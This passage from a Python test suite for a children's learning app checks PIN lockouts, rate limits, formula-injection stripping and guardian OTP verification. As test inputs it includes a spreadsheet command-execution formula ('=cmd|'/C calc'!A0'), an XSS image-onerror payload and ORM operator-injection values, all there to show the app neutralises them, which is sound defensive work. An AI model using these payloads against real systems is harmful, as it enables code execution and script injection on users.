		"""`tabStudent.name` is case-insensitive too, so login_student had the same hole."""
		girl, _ = self._mk("R3Lock Docname Girl")
		self._acct("id", girl.name)
		errors = []
		for i, spelling in enumerate((girl.name, girl.name.upper(), girl.name.capitalize(),
		                              girl.name.swapcase(), girl.name.upper(), girl.name,
		                              girl.name.capitalize(), girl.name.swapcase(),
		                              girl.name.upper(), girl.name), start=1):
			errors.append(api.login_student(student=spelling, pin="60%02d" % i).get("error"))
		self.assertIn("locked", errors, errors)
		# the canonical docname is what got charged, not the typed casing
		self.assertEqual(api.login_student(student=girl.name.upper(),
		                                   pin=self.PIN).get("error"), "locked")

	def test_two_different_girls_never_share_a_lockout_budget(self):
		"""The canonicalisation must be coarse enough to merge spellings, never so coarse that
		locking one girl locks another — that would be a denial of service on a child."""
		one, _ = self._mk("R3Lock Separate One")
		two, _ = self._mk("R3Lock Separate Two")
		self._acct("nm", api._login_name_key("R3Lock Separate One"))
		self._acct("nm", api._login_name_key("R3Lock Separate Two"))
		for i in range(api._MAX_PIN_TRIES + 1):
			api.login_by_name(name="R3Lock Separate One", pin="50%02d" % i)
		self.assertEqual(api.login_by_name(name="R3Lock Separate One",
		                                   pin=self.PIN).get("error"), "locked")
		self.assertTrue(api.login_by_name(name="R3Lock Separate Two", pin=self.PIN).get("ok"),
		                "locking one girl must never lock another")
		self.assertTrue(one.name and two.name)

	def test_a_girl_whose_stored_name_has_double_spaces_can_still_log_in(self):
		"""Signup collapses whitespace runs before storing; login only end-stripped, so a girl
		who typed "Asha  Devi" could never log in again. One normalisation on both sides."""
		girl, _ = self._mk("R3Lock  Spacey  Girl")
		self._acct("nm", api._login_name_key("R3Lock  Spacey  Girl"))
		for typed in ("R3Lock  Spacey  Girl", "R3Lock Spacey Girl", "r3lock spacey girl"):
			r = api.login_by_name(name=typed, pin=self.PIN)
			self.assertTrue(r.get("ok"), "%r could not log in: %r" % (typed, r))
		self.assertTrue(girl.name)

	def test_a_girl_mistyping_her_own_pin_is_not_punished(self):
		girl, _ = self._mk("R3Lock Mistype Girl")
		acct = self._acct("nm", "r3lock mistype girl")
		for p in ("1111", "2222", "3333"):
			self.assertEqual(api.login_by_name(name="R3Lock Mistype Girl", pin=p).get("error"),
			                 "bad_login")
		r = api.login_by_name(name="R3Lock Mistype Girl", pin=self.PIN)
		self.assertTrue(r.get("ok"), r)              # three mistypes cost her nothing
		self.assertEqual(r["id"], girl.name)
		short_b, day_b = api._login_buckets(acct)
		self.assertEqual(api._rate_state(short_b)[0], 0)      # a good login clears the budget
		self.assertEqual(api._rate_state(day_b)[0], 0)

	def test_the_cooldown_lifts_by_itself_and_the_window_is_never_re_armed(self):
		"""She must get back in without anyone's help. The window is armed once, so shortening
		its TTL is exactly what waiting it out does (asserted rather than slept)."""
		self._mk("R3Lock Cooldown Girl")
		acct = self._acct("nm", "r3lock cooldown girl")
		short_b, day_b = api._login_buckets(acct)
		for i in range(api._MAX_PIN_TRIES):
			api.login_by_name(name="R3Lock Cooldown Girl", pin="90%02d" % i)
		self.assertEqual(api.login_by_name(name="R3Lock Cooldown Girl",
		                                   pin=self.PIN).get("error"), "locked")
		count, ttl = api._rate_state(short_b)
		self.assertEqual(count, api._MAX_PIN_TRIES)
		self.assertLessEqual(ttl, api._LOCKOUT_SECONDS)        # not pushed out by later tries
		c = api._rl_cache()
		c.delete(c.make_key(api._RL_PREFIX + short_b))         # == the window expiring
		r = api.login_by_name(name="R3Lock Cooldown Girl", pin=self.PIN)
		self.assertTrue(r.get("ok"), r)
		self.assertEqual(api._rate_state(day_b)[0], 0)

	def test_the_day_budget_is_what_actually_stops_brute_force(self):
		"""The 5-minute cooldown alone allows ~96 guesses/hour, which cracks a 4-digit PIN in
		days. The 24h budget cuts that to 50/day (~200 days for half the space) — and it holds
		even once the short window has closed."""
		self._mk("R3Lock Patient Girl")
		acct = self._acct("nm", "r3lock patient girl")
		short_b, day_b = api._login_buckets(acct)
		c = api._rl_cache()
		while api._rate_state(day_b)[0] < api._MAX_PIN_TRIES_DAY:
			api._login_failed(acct)                            # the endpoint's own accounting
		c.delete(c.make_key(api._RL_PREFIX + short_b))         # attacker waits out the cooldown
		self.assertEqual(api._rate_state(short_b)[0], 0)
		self.assertEqual(api.login_by_name(name="R3Lock Patient Girl",
		                                   pin=self.PIN).get("error"), "locked")
		self.assertGreater(api._rate_state(day_b)[1], 3600)    # parked for the rest of the day

	def test_a_facilitator_releases_a_locked_girl_and_a_learner_cannot(self):
		"""The release valve is what makes a per-account lockout tolerable: without it an
		attacker could keep a child out of her own profile for a day."""
		girl, _ = self._mk("R3Lock Release Girl")
		acct = self._acct("nm", "r3lock release girl")
		self._acct("id", girl.name)
		for i in range(api._MAX_PIN_TRIES):
			api.login_by_name(name="R3Lock Release Girl", pin="10%02d" % i)
		self.assertEqual(api.login_by_name(name="R3Lock Release Girl",
		                                   pin=self.PIN).get("error"), "locked")
		# a learner (Website User, no roles) must not be able to clear anybody's lockout
		user = "r3lock-release@" + api._ONLINE_EMAIL_DOMAIN
		if not frappe.db.exists("User", user):
			frappe.get_doc({"doctype": "User", "email": user, "first_name": "R3 Learner",
			                "send_welcome_email": 0,
			                "user_type": "Website User"}).insert(ignore_permissions=True)
		self.addCleanup(lambda: frappe.delete_doc("User", user, force=1, ignore_permissions=True))
		frappe.db.commit()
		old_user = frappe.session.user
		self.addCleanup(lambda: frappe.set_user(old_user))
		frappe.set_user(user)
		with self.assertRaises(frappe.PermissionError):
			api.clear_login_lockout(name="R3Lock Release Girl")
		frappe.set_user("Administrator")
		out = api.clear_login_lockout(student=girl.name)      # by docname → also her NAME bucket
		self.assertTrue(out.get("ok"), out)
		self.assertTrue(any(v["was_locked"] for v in out["cleared"].values()), out)
		self.assertTrue(api.login_by_name(name="R3Lock Release Girl", pin=self.PIN).get("ok"))
		self.assertEqual(api.clear_login_lockout().get("error"), "no_target")

	def test_login_student_lockout_is_per_account_and_independent(self):
		"""login_student was already per-account; it must stay that way, and its budget must
		be separate from the name budget so one girl's docname cannot lock every girl who
		shares her first name."""
		a, _ = self._mk("R3Lock Id Girl")
		b, _ = self._mk("R3Lock Id Girl Two")
		acct_a = self._acct("id", a.name)
		self._acct("id", b.name)
		self._acct("nm", "r3lock id girl")
		for i in range(api._MAX_PIN_TRIES):
			self.assertEqual(api.login_student(a.name, "20%02d" % i).get("error"), "wrong_pin")
		self.assertEqual(api.login_student(a.name, self.PIN).get("error"), "locked")
		self.assertTrue(api.login_student(b.name, self.PIN).get("ok"))          # she is fine
		# ...and so is the name path for the very same girl
		self.assertTrue(api.login_by_name(name="R3Lock Id Girl", pin=self.PIN).get("ok"))
		self.assertEqual(api._rate_state(api._login_buckets(acct_a)[0])[0], api._MAX_PIN_TRIES)

	def test_login_by_name_coerces_a_container_name(self):
		"""`(name or "").strip()` was an AttributeError → HTTP 500 for any JSON container, and
		a container reaching the get_all filter would be an ORM operator spec, not a name."""
		for bad in ({"student_name": ["like", "R3Lock%"]}, ["like", "%"], True, None, "", "   "):
			self.assertEqual(api.login_by_name(name=bad, pin=self.PIN).get("error"), "bad_login",
			                 repr(bad))

	# ================================================ 2. availability of the ceilings
	def test_a_busy_hour_for_thirty_girls_on_one_ip_refuses_nothing(self):
		"""Every per-IP ceiling in the app at once, for a NAT'd classroom — including the
		FAIL-CLOSED one, where a refusal would stop a girl enrolling. The tightest ceiling
		is signup (60/h); a 30-girl class fits with room to spare."""
		self.addCleanup(_use_trusted_proxies([]))
		old = getattr(frappe.local, "request", None)
		self.addCleanup(lambda: setattr(frappe.local, "request", old))
		frappe.local.request = _fake_request(None, "203.0.113.77")   # the centre's WAN address
		ip = api._client_ip()
		self.assertEqual(ip, "203.0.113.77")
		LOAD = (                     # (bucket, ceiling, calls per girl per hour, fail_closed)
			("submit", 3000, 12, False), ("event", 6000, 20, False), ("att", 2000, 12, False),
			("doubt", 2000, 3, False), ("testsub", 600, 1, False), ("signup", 60, 1, True),
		)
		refused = {}
		for bucket, limit, per_girl, closed in LOAD:
			b = bucket + ":" + ip
			self._reset_bucket(b)
			n = sum(0 if api._rate_ok(b, limit, 3600, fail_closed=closed) else 1
			        for _ in range(30 * per_girl))
			if n:
				refused[bucket] = n
		self.assertEqual(refused, {})
		# and the login-failure ceiling leaves room for a whole class mistyping
		self.assertGreaterEqual(api._MAX_PIN_FAILS_PER_IP, 30 * 8)

	# ==================================================== 4. formula injection at ingest
	def test_identifier_fields_lose_a_formula_lead_at_ingest(self):
		"""The export-side guard cannot be the only one: frappe's prepared-report automation
		and the Desk list/report-view export (frappe.desk.reportview.export_query) never enter
		a report's execute(). So the payload is refused when it is STORED."""
		for p in self.LEADS:
			with self.subTest(p):
				self.assertNotIn(api._content_key(p + "l1")[:1], "=+-@\t\r")
				self.assertNotIn(api._display_name(p + "Asha")[:1], "=+-@\t\r")
		# ordinary content keys and names are untouched
		for good in ("life-skills", "l1", "word-listen", "hi", "क्" + self.ZWJ + "ष"):
			self.assertEqual(api._content_key(good), good)
		for good in ("गुड़िया देवी", "D'Souza Rani-Kumari", "Asha"):
			self.assertEqual(api._display_name(good), good)
		# a value made of NOTHING but leads is empty, not a stored "="
		self.assertEqual(api._content_key("=+-@"), "")

	def test_the_write_endpoints_store_inert_identifiers(self):
		girl, tok = self._mk("R3Ing Store Girl")
		for i, p in enumerate(self.LEADS):
			r = api.submit_attempt(student=girl.name, token=tok, track=p + "life-skills",
			                       lesson=p + "l1", activity=p, stars=2, client_id="r3ing-s%d" % i)
			self.assertTrue(r.get("ok"), r)
			row = frappe.db.get_value("Lesson Attempt", r["name"],
			                          ["track", "lesson", "activity"], as_dict=True)
			for v in row.values():
				self.assertNotIn((v or " ")[:1], "=+-@\t\r", repr(row))
		r = api.log_attendance(student=girl.name, token=tok, date=frappe.utils.nowdate(), secs=60,
		                       device_id="=cmd|'/C calc'!A0", client_id="r3ing-p1")
		self.assertTrue(r.get("ok"), r)
		dev = frappe.db.get_value("Attendance Ping", {"client_id": "r3ing-p1"}, "device_id")
		self.assertNotIn(dev[:1], "=+-@\t\r", repr(dev))
		r = api.submit_test(student=girl.name, token=tok, track="life-skills", status="exited",
		                    exit_reason="-2+3tab_hidden", score=4, total=5, client_id="r3ing-t1")
		self.assertEqual(frappe.db.get_value("Test Attempt", r["name"], "exit_reason"),
		                 "2+3tab_hidden")

	def test_a_self_registered_name_cannot_open_with_a_formula(self):
		api._rate_reset("signup:" + api._client_ip())
		self.addCleanup(api._rate_reset, "signup:" + api._client_ip())
		made = []

		def _rm():
			frappe.db.commit()
			for n in made:
				frappe.db.delete("Student", {"name": n})
			frappe.db.commit()

		self.addCleanup(_rm)
		for p in self.LEADS:
			r = api.signup_student(name=p + "Asha", pin=self.PIN)
			self.assertTrue(r.get("ok"), r)
			made.append(r["id"])
			stored = frappe.db.get_value("Student", r["id"], "student_name")
			self.assertNotIn(stored[:1], "=+-@\t\r", repr(stored))

	def test_her_own_words_are_never_rewritten_to_suit_a_spreadsheet(self):
		"""THE LINE THIS MUST NOT CROSS. A doubt question is her PROSE: '=5 किलो' and
		'- बाजार में' are things a girl legitimately writes, and a report must show what she
		actually wrote. Prose stays protected by the lossless OUTPUT guard, never by editing
		the stored value."""
		txr, ttok = self._mk("R3Ing Prose Txr")
		her_words = "=5 किलो आलू - बाजार में क्" + self.ZWJ + "ष मिला @दुकान पर +2 रुपया"
		d = api.report_doubt(student=txr.name, token=ttok, track="life-skills", lesson="l1",
		                     activity="quiz", question=her_words, client_id="r3ing-tx")
		self.assertTrue(d.get("ok"), d)
		self.assertEqual(frappe.db.get_value("Lesson Doubt", d["name"], "question"), her_words,
		                 [hex(ord(ch)) for ch in her_words[:4]])
		q = api.report_doubt(student=txr.name, token=ttok, track="life-skills", lesson="l1",
		                     activity="quiz", question="=यह क्यों? -मदद चाहिए",
		                     client_id="r3ing-d1")
		self.assertEqual(frappe.db.get_value("Lesson Doubt", q["name"], "question"),
		                 "=यह क्यों? -मदद चाहिए")


class TestGuardianOTP(FrappeTestCase):
	"""Guardian phone verification: enrolment consent, and PIN recovery.

	The design under test is deliberately narrow — a code proves a PARENT'S number at signup
	and at recovery, and never becomes the daily login (see the GUARDIAN PHONE VERIFICATION
	note in api.py for why: a child-directed Families app must not collect children's phone
	numbers, most girls do not own the handset, and an OTP-gated login would brick an
	offline-first app). So these tests pin three things, in order of how much a failure would
	cost:

	  1. THE PRIVACY GUARANTEE. No phone number reaches the database in any recoverable form
	     — not in the challenge, not on the Student, not in the consent record. That is the
	     claim made to Play's Data Safety form and to a guardian, so it is asserted directly
	     against the stored rows rather than trusted from the code's shape.
	  2. THE POWERS ARE SEPARATE. A code obtained to consent to a NEW profile cannot be spent
	     to reset an EXISTING girl's PIN, a ticket cannot be replayed, a code cannot be
	     replayed, and one guardian cannot touch another guardian's daughter.
	  3. IT FAILS CLOSED AND OFF. With the feature disabled nothing sends and every door
	     refuses; the abuse ceilings hold.

	Everything runs on the Console channel, which sends no message anywhere and hands the
	code back only under frappe.flags.in_test / developer_mode. The numbers below are
	fictional; nothing is ever dialled, but they are shaped like real Indian mobiles because
	_norm_mobile rejects anything else."""

	G1 = "9876500001"          # guardian one
	G2 = "9876500002"          # guardian two (a different family)

	def setUp(self):
		self.addCleanup(frappe.set_user, "Administrator")
		self._enable_otp()

	# -- fixtures ---------------------------------------------------------------
	def _enable_otp(self, channel="Console (testing only)", ttl=10, enabled=1):
		"""Switch the feature on for one test and put it back afterwards.

		The document cache is cleared on both legs because _otp_config reads the Single
		through frappe.get_cached_doc — without this a later test in the same process would
		keep seeing whatever this one set."""
		ss = frappe.get_single("Hikmat Settings")
		before = {"otp_enabled": ss.otp_enabled, "otp_channel": ss.otp_channel,
		          "otp_ttl_minutes": ss.otp_ttl_minutes}

		def _restore():
			s = frappe.get_single("Hikmat Settings")
			for k, v in before.items():
				s.set(k, v)
			s.save(ignore_permissions=True)
			frappe.db.commit()
			frappe.clear_document_cache("Hikmat Settings", "Hikmat Settings")

		self.addCleanup(_restore)
		ss.otp_enabled = enabled
		ss.otp_channel = channel
		ss.otp_ttl_minutes = ttl
		ss.save(ignore_permissions=True)
		frappe.db.commit()
		frappe.clear_document_cache("Hikmat Settings", "Hikmat Settings")

	def _buckets(self, mobile):
		h = api._mobile_hash(api._norm_mobile(mobile))
		ip = api._client_ip()
		return (["otpdayall:" + h, "otpreset:" + h, "otpip:" + ip, "otpver:" + ip,
		         "otpresetip:" + ip, "signup:" + ip]
		        + ["otp%s:%s:%s" % (k, p, h) for k in ("cool", "day") for p in ("consent", "recovery")])

	def _reset_buckets(self, mobile):
		for b in self._buckets(mobile):
			api._rate_reset(b)
			self.addCleanup(api._rate_reset, b)

	def _cleanup_number(self, mobile):
		h = api._mobile_hash(api._norm_mobile(mobile))

		def _rm():
			frappe.set_user("Administrator")
			for s in frappe.get_all("Student", filters={"guardian_mobile_hash": h}, pluck="name"):
				frappe.db.delete("Hikmat Consent", {"student": s})
				frappe.db.delete("Student", {"name": s})
			frappe.db.delete("Hikmat OTP", {"mobile_hash": h})
			frappe.db.commit()

		self.addCleanup(_rm)

	def _send(self, mobile, purpose="consent"):
		"""Request a code, clearing the 60-second resend cooldown first.

		Cleared explicitly rather than slept through: the cooldown is real and tested
		separately, and a suite that waited it out would take minutes."""
		api._rate_reset("otpcool:%s:%s" % (purpose, api._mobile_hash(api._norm_mobile(mobile))))
		self._cleanup_number(mobile)
		return api.send_guardian_otp(mobile=mobile, purpose=purpose)

	def _ticket(self, mobile, purpose="consent"):
		r = self._send(mobile, purpose)
		self.assertTrue(r.get("ok"), r)
		v = api.verify_guardian_otp(mobile=mobile, code=r["code"], purpose=purpose)
		self.assertTrue(v.get("ok"), v)
		return v

	def _enrol(self, mobile, name, pin="1234"):
		"""A full consent enrolment, returning the signup response."""
		self._reset_buckets(mobile)
		t = self._ticket(mobile, "consent")
		r = api.signup_with_consent(mobile=mobile, ticket=t["ticket"], name=name, pin=pin)
		self.assertTrue(r.get("ok"), r)
		return r

	# -- 1. the privacy guarantee ----------------------------------------------
	def test_no_phone_number_is_ever_stored_in_recoverable_form(self):
		"""The load-bearing claim: a database dump yields no guardians' phone numbers.

		Asserted by searching every stored value on all three row types for the digits
		themselves, in each spelling someone might have typed, rather than by inspecting the
		code that writes them — this is the assertion that has to survive a future refactor
		that "helpfully" keeps the number around for re-sending."""
		self._reset_buckets(self.G1)
		r = self._enrol(self.G1, "Privacy Test Girl")
		spellings = (self.G1, "+91" + self.G1, "91" + self.G1, "0" + self.G1)

		def _haystack(doctype, name):
			return " ".join(str(v) for v in frappe.db.get_value(
				doctype, name, "*", as_dict=True).values() if v is not None)

		hay = [_haystack("Student", r["id"])]
		hay += [_haystack("Hikmat Consent", c) for c in
		        frappe.get_all("Hikmat Consent", filters={"student": r["id"]}, pluck="name")]
		hay += [_haystack("Hikmat OTP", o) for o in
		        frappe.get_all("Hikmat OTP", pluck="name",
		                       filters={"mobile_hash": api._mobile_hash(api._norm_mobile(self.G1))})]
		for h in hay:
			for spelling in spellings:
				self.assertNotIn(spelling, h)
		# ...and the last 4 digits ARE kept, deliberately: a facilitator has to be able to
		# confirm which number is on file without the app holding it.
		self.assertEqual(frappe.db.get_value("Student", r["id"], "guardian_mobile_last4"),
		                 self.G1[-4:])

	def test_the_code_itself_is_not_stored(self):
		self._reset_buckets(self.G1)
		self._cleanup_number(self.G1)
		r = self._send(self.G1)
		code = r["code"]
		row = frappe.get_all("Hikmat OTP", filters={"mobile_hash": api._mobile_hash(
			api._norm_mobile(self.G1))}, fields=["code_hash"], limit=1)[0]
		self.assertNotIn(code, row.code_hash)
		self.assertTrue(row.code_hash.startswith("pbkdf2:"))

	def test_every_spelling_of_one_number_is_one_identity(self):
		"""Canonicalisation is a security property here, not cosmetics: the number keys the
		resend cooldown and the daily ceiling, so a per-spelling hash would hand out a fresh
		send budget per spelling — the same class of bypass _login_name_key exists to close —
		and a girl enrolled under one spelling could not be recovered under another."""
		want = "+919876543210"
		for spelling in ("9876543210", "+91 98765 43210", "919876543210", "09876543210",
		                 "00919876543210", "+91-98765-43210", "(98765) 43210"):
			self.assertEqual(api._norm_mobile(spelling), want, spelling)
		hashes = {api._mobile_hash(api._norm_mobile(s))
		          for s in ("9876543210", "+91 98765 43210", "09876543210")}
		self.assertEqual(len(hashes), 1)

	def test_bad_numbers_are_refused_not_half_supported(self):
		for bad in ("1234567890", "5876543210", "98765", "98765432101", "", None,
		            "abcdefghij", {"a": 1}, ["9876543210"], "+1 415 555 2671"):
			self.assertEqual(api._norm_mobile(bad), "", repr(bad))
		self.assertEqual(api.send_guardian_otp(mobile="12345").get("error"), "bad_mobile")

	def test_mobile_hash_is_keyed_not_a_bare_digest(self):
		"""A bare sha256 of a 10-digit number is a rainbow table anyone can build; the HMAC
		key lives in site_config.json, so a database-only dump cannot reverse it."""
		import hashlib
		e164 = "+919876543210"
		self.assertNotEqual(api._mobile_hash(e164),
		                    hashlib.sha256(e164.encode()).hexdigest())
		self.assertNotEqual(api._mobile_hash(e164),
		                    hashlib.sha256(b"9876543210").hexdigest())

	# -- 2. consent enrolment --------------------------------------------------
	def test_consent_enrolment_creates_a_verified_profile_and_a_consent_record(self):
		self._reset_buckets(self.G1)
		r = self._enrol(self.G1, "Consent Flow Girl")
		stu = frappe.db.get_value("Student", r["id"],
		                          ["student_name", "guardian_verified", "guardian_consent_on",
		                           "guardian_mobile_last4", "login_pin"], as_dict=True)
		self.assertEqual(stu.student_name, "Consent Flow Girl")
		self.assertTrue(stu.guardian_verified)
		self.assertTrue(stu.guardian_consent_on)
		self.assertEqual(stu.guardian_mobile_last4, self.G1[-4:])
		self.assertTrue(api._pin_ok(stu.login_pin, "1234"))      # she can log in normally
		con = frappe.get_all("Hikmat Consent", filters={"student": r["id"]},
		                     fields=["consent_text", "consent_text_version", "channel",
		                             "guardian_mobile_last4", "otp"])
		self.assertEqual(len(con), 1)
		# The wording is snapshotted from the SERVER constant, so what a guardian saw and
		# what we filed as agreed-to are provably the same string.
		self.assertEqual(con[0].consent_text_version, api._CONSENT_VERSION)
		self.assertIn(api._CONSENT_TEXT_EN, con[0].consent_text)
		self.assertIn(api._CONSENT_TEXT_HI, con[0].consent_text)
		self.assertEqual(con[0].channel, "Console")
		self.assertTrue(con[0].otp)                              # the audit chain is intact

	def test_a_rejected_form_does_not_cost_the_guardian_their_code(self):
		"""Validation is shared with plain signup (_validated_profile_fields), so the error
		codes the game switches on are identical — and, because the form is checked BEFORE the
		ticket is redeemed, a girl who fumbles the PIN box can simply fix it. When these were
		fused the first rejected submit spent the ticket, and a guardian standing next to her
		had to request a whole new code over WhatsApp to correct a typo."""
		self._reset_buckets(self.G1)
		self._cleanup_number(self.G1)
		t = self._ticket(self.G1, "consent")
		self.assertEqual(api.signup_with_consent(mobile=self.G1, ticket=t["ticket"],
		                                         name="A", pin="1234").get("error"), "bad_name")
		self.assertEqual(api.signup_with_consent(mobile=self.G1, ticket=t["ticket"],
		                                         name="Valid Name", pin="12").get("error"), "bad_pin")
		# ...and the very same ticket still works once the form is right
		good = api.signup_with_consent(mobile=self.G1, ticket=t["ticket"],
		                               name="Second Try Girl", pin="1234")
		self.assertTrue(good.get("ok"), good)
		self.assertTrue(frappe.db.get_value("Student", good["id"], "guardian_verified"))

	def test_signup_strips_markup_through_the_consent_door_too(self):
		self._reset_buckets(self.G1)
		self._cleanup_number(self.G1)
		t = self._ticket(self.G1, "consent")
		r = api.signup_with_consent(mobile=self.G1, ticket=t["ticket"],
		                            name="<img src=x onerror=alert(1)>Neeta", pin="1234")
		self.assertTrue(r.get("ok"), r)
		self.assertEqual(frappe.db.get_value("Student", r["id"], "student_name"), "Neeta")

	# -- 3. codes and tickets are single-use, and bound ------------------------
	def test_a_correct_code_cannot_be_replayed(self):
		self._reset_buckets(self.G1)
		self._cleanup_number(self.G1)
		r = self._send(self.G1)
		self.assertTrue(api.verify_guardian_otp(mobile=self.G1, code=r["code"]).get("ok"))
		again = api.verify_guardian_otp(mobile=self.G1, code=r["code"])
		self.assertFalse(again.get("ok"))
		self.assertEqual(again.get("error"), "bad_code")

	def test_a_ticket_cannot_be_replayed(self):
		self._reset_buckets(self.G1)
		self._cleanup_number(self.G1)
		t = self._ticket(self.G1, "consent")
		first = api.signup_with_consent(mobile=self.G1, ticket=t["ticket"],
		                                name="Ticket Once Girl", pin="1234")
		self.assertTrue(first.get("ok"), first)
		second = api.signup_with_consent(mobile=self.G1, ticket=t["ticket"],
		                                 name="Ticket Twice Girl", pin="1234")
		self.assertEqual(second.get("error"), "bad_ticket")
		self.assertFalse(frappe.db.exists("Student", {"student_name": "Ticket Twice Girl"}))

	def test_a_ticket_is_useless_without_the_number_it_was_issued_for(self):
		"""Defence in depth: a ticket leaked on a shared screen or in a log authorises
		nothing on its own."""
		self._reset_buckets(self.G1)
		self._reset_buckets(self.G2)
		self._cleanup_number(self.G1)
		t = self._ticket(self.G1, "consent")
		r = api.signup_with_consent(mobile=self.G2, ticket=t["ticket"],
		                            name="Wrong Number Girl", pin="1234")
		self.assertEqual(r.get("error"), "bad_ticket")

	def test_a_consent_ticket_cannot_reset_an_existing_girls_pin(self):
		"""The two powers are genuinely different — consent creates a profile, recovery takes
		one over — so the purpose is bound into the challenge and re-checked on redemption."""
		self._reset_buckets(self.G1)
		enrolled = self._enrol(self.G1, "Purpose Bound Girl")
		consent_ticket = self._ticket(self.G1, "consent")["ticket"]
		r = api.reset_pin(mobile=self.G1, ticket=consent_ticket,
		                  student=enrolled["id"], new_pin="9999")
		self.assertEqual(r.get("error"), "bad_ticket")
		self.assertTrue(api._pin_ok(
			frappe.db.get_value("Student", enrolled["id"], "login_pin"), "1234"))

	def test_five_wrong_codes_void_the_challenge(self):
		self._reset_buckets(self.G1)
		self._cleanup_number(self.G1)
		r = self._send(self.G1)
		wrong = "000000" if r["code"] != "000000" else "111111"
		for _ in range(api._OTP_MAX_ATTEMPTS):
			bad = api.verify_guardian_otp(mobile=self.G1, code=wrong)
			self.assertEqual(bad.get("error"), "bad_code")
			# tries_left is deliberately absent: its PRESENCE told an unauthenticated caller
			# that a live challenge existed for that number, i.e. that the number belongs to a
			# family in the programme, which is the leak the api.py block comment promises is
			# not there. Every failure now answers identically.
			self.assertNotIn("tries_left", bad)
		# the RIGHT code is now dead too — the challenge is spent, not merely rate-limited
		self.assertEqual(api.verify_guardian_otp(mobile=self.G1, code=r["code"]).get("error"),
		                 "bad_code")

	def test_an_expired_code_is_refused(self):
		self._reset_buckets(self.G1)
		self._cleanup_number(self.G1)
		r = self._send(self.G1)
		name = frappe.get_all("Hikmat OTP", filters={"mobile_hash": api._mobile_hash(
			api._norm_mobile(self.G1))}, pluck="name", order_by="creation desc", limit=1)[0]
		frappe.db.set_value("Hikmat OTP", name, "expires_on",
		                    frappe.utils.add_to_date(frappe.utils.now(), minutes=-1),
		                    update_modified=False)
		frappe.db.commit()
		self.assertEqual(api.verify_guardian_otp(mobile=self.G1, code=r["code"]).get("error"),
		                 "bad_code")

	def test_an_expired_ticket_is_refused(self):
		self._reset_buckets(self.G1)
		self._cleanup_number(self.G1)
		t = self._ticket(self.G1, "consent")
		name = frappe.get_all("Hikmat OTP", filters={"mobile_hash": api._mobile_hash(
			api._norm_mobile(self.G1))}, pluck="name", order_by="creation desc", limit=1)[0]
		frappe.db.set_value("Hikmat OTP", name, "ticket_expires_on",
		                    frappe.utils.add_to_date(frappe.utils.now(), minutes=-1),
		                    update_modified=False)
		frappe.db.commit()
		r = api.signup_with_consent(mobile=self.G1, ticket=t["ticket"],
		                            name="Stale Ticket Girl", pin="1234")
		self.assertEqual(r.get("error"), "bad_ticket")

	# -- 4. PIN recovery -------------------------------------------------------
	def test_recovery_resets_the_pin_and_clears_the_lockout(self):
		"""The gap this fills: before this endpoint existed a forgotten PIN was terminal —
		there was no reset path at all, not even a staff one."""
		self._reset_buckets(self.G1)
		girl = self._enrol(self.G1, "Recovery Girl", pin="1234")
		# lock her out the way a real girl does: wrong PINs until the account parks
		for _ in range(api._MAX_PIN_TRIES):
			api.login_by_name(name="Recovery Girl", pin="0000")
		self.assertEqual(api.login_by_name(name="Recovery Girl", pin="1234").get("error"), "locked")

		v = self._ticket(self.G1, "recovery")
		self.assertEqual([s["id"] for s in v["students"]], [girl["id"]])
		r = api.reset_pin(mobile=self.G1, ticket=v["ticket"], student=girl["id"], new_pin="4321")
		self.assertTrue(r.get("ok"), r)
		self.assertTrue(r.get("token"))
		# new PIN works, old one does not, and the lockout is gone
		ok = api.login_by_name(name="Recovery Girl", pin="4321")
		self.assertTrue(ok.get("ok"), ok)
		self.assertEqual(api.login_by_name(name="Recovery Girl", pin="1234").get("error"),
		                 "bad_login")

	def test_recovery_does_not_rotate_the_bearer_token(self):
		"""Rotating would silently log her out of every provisioned campus laptop, which
		authenticates her offline against a cached roster entry — punishing a guardian for
		using the recovery flow. The reset already required control of the handset."""
		self._reset_buckets(self.G1)
		girl = self._enrol(self.G1, "Keep Token Girl")
		before = frappe.db.get_value("Student", girl["id"], "auth_token")
		v = self._ticket(self.G1, "recovery")
		api.reset_pin(mobile=self.G1, ticket=v["ticket"], student=girl["id"], new_pin="4321")
		self.assertEqual(frappe.db.get_value("Student", girl["id"], "auth_token"), before)

	def test_one_guardian_cannot_reset_another_familys_pin(self):
		self._reset_buckets(self.G1)
		self._reset_buckets(self.G2)
		mine = self._enrol(self.G1, "Guardian One Girl")
		theirs = self._enrol(self.G2, "Guardian Two Girl")
		v = self._ticket(self.G1, "recovery")
		r = api.reset_pin(mobile=self.G1, ticket=v["ticket"], student=theirs["id"],
		                  new_pin="9999")
		# One indistinguishable refusal for "not your child" and "bad ticket": answering
		# not_found vs bad_ticket turned this into an unmetered oracle mapping a phone number
		# to one specific named minor (docnames are not secret — a campus laptop caches the
		# whole roster).
		self.assertEqual(r.get("error"), "bad_ticket")
		self.assertTrue(api._pin_ok(
			frappe.db.get_value("Student", theirs["id"], "login_pin"), "1234"))
		self.assertTrue(frappe.db.exists("Student", mine["id"]))

	def test_recovery_lists_every_sister_on_one_handset(self):
		"""Sisters sharing a guardian's phone is the normal case, which is why the girl is
		named AFTER the number is proven rather than typed alongside it."""
		self._reset_buckets(self.G1)
		a = self._enrol(self.G1, "Sister One")
		b = self._enrol(self.G1, "Sister Two")
		v = self._ticket(self.G1, "recovery")
		self.assertEqual({s["id"] for s in v["students"]}, {a["id"], b["id"]})

	def test_an_unknown_number_is_charged_the_same_budget_as_a_known_one(self):
		"""Otherwise the CEILING is the oracle the uniform reply exists to prevent: an enrolled
		number eventually answers rate_limited, an unknown one never would."""
		self._reset_buckets(self.G2)
		self._cleanup_number(self.G2)
		h = api._mobile_hash(api._norm_mobile(self.G2))
		self.assertTrue(api.send_guardian_otp(mobile=self.G2, purpose="recovery").get("ok"))
		self.assertEqual(api._rate_state("otpday:recovery:" + h)[0], 1)
		for _ in range(api._OTP_PER_NUMBER_DAY - 1):
			api._rate_reset("otpcool:recovery:" + h)
			api.send_guardian_otp(mobile=self.G2, purpose="recovery")
		api._rate_reset("otpcool:recovery:" + h)
		self.assertEqual(api.send_guardian_otp(mobile=self.G2, purpose="recovery").get("error"),
		                 "rate_limited")

	def test_recovery_for_an_unknown_number_answers_uniformly(self):
		"""No API-level oracle: the reply is the same shape whether or not a family matched.
		(The delivered message is the only difference — see the ENUMERATION note in api.py.)"""
		self._reset_buckets(self.G2)
		self._cleanup_number(self.G2)
		r = api.send_guardian_otp(mobile=self.G2, purpose="recovery")
		self.assertTrue(r.get("ok"), r)
		self.assertEqual(r.get("last4"), self.G2[-4:])
		self.assertNotIn("code", r)          # nothing was sent, so there is no code to reveal
		self.assertFalse(frappe.get_all("Hikmat OTP", filters={
